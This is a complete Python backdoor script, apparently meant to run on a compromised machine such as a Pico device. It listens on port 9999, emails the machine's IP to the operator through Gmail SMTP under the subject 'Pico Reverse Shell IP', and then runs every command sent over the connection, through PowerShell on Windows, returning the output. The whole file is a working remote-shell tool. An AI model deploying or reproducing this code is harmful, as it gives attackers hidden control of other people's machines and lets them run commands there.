import subprocess
import socket
import os
from sys import platform, exit, argv
from email.message import EmailMessage
import smtplib

sender = argv[1]
password = argv[2]
PORT = 9999

def get_ip():
    if platform == "win32":
        return socket.gethostbyname(socket.gethostname()), True
    else:
        from re import findall
        ifconfig = subprocess.getoutput("ifconfig")
        lst = findall("(?!255)(?!5)[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.(?!255)[0-9]{1,3}", ifconfig)
        tmp = [x for x in lst if x != "127.0.0.1"]
        return tmp[0], False

def send_mail(text):
    msg = EmailMessage()
    msg.set_content(text)
    msg["Subject"] = "Pico Reverse Shell IP"
    msg["From"] = sender
    msg["To"] = sender
    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender, password)
        server.send_message(msg)

def main():
    try:
        ip, powershell = get_ip()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ip, PORT))
        s.listen()
        send_mail(f"Target machine IP is {ip}")
        client, _ = s.accept()
        client.send("[*] Connection Established\n".encode())
        
        done = False
        while not done:
            try:
                client.send(str.encode(os.getcwd() + ">"))
                data = client.recv(1024).decode("UTF-8").strip()
                if data == "exit":
                    client.send("Goodbye...".encode())
                    client.close()
                    s.close()
                    done = True
                elif data[:2] == "cd":
                    os.chdir(data[3:])
                elif len(data) > 0:
                    if powershell:
                        proc = subprocess.Popen(f"powershell.exe {data}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    else:
                        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    output_str = str(stdout_value, "UTF-8")
                    client.send(str.encode("\n" + output_str))
            except Exception as e:
                    continue
    except KeyboardInterrupt:
        exit()

if __name__ == "__main__":
    main()